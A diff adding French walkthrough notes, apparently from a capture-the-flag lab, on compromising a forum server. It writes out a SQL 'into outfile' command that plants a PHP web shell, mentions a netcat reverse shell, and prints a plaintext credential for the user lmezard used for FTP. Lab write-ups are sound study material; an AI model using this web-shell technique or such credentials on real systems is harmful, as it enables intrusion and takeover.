@@ -18,3 +18,15 @@ Best regards.
 </pre>
 - On peut donc se connecter sur le [PhpMyAdmin](https://192.168.1.96/phpmyadmin/).
 - En changant le password de admin par celui de lmezard on peut se connecter en tant qu'admin sur le forum
+- J'essaye maintenant d'inserer un code php dans le serveur web pour qu'il soit executer par celui ci
+- en exutant cett commande sql je peux ecrire dans un fichier
+```
+SELECT "<?php system($_GET['cmd']); ?>" into outfile "/dir/dir/file.php"
+```
+- en testant tout les dossiers du forum un est executable templates_c
+- Je creer donc un fichier avec un reverse shell pour que se soit plus facile et je creer un serveur en local avec netcat
+- dans les home un dossier est presant LOOKATME qui contient un dossier password
+```
+lmezard:G!@M6f4Eatau{sF"
+```
+- On peut se connecter au FTP grace a ces login
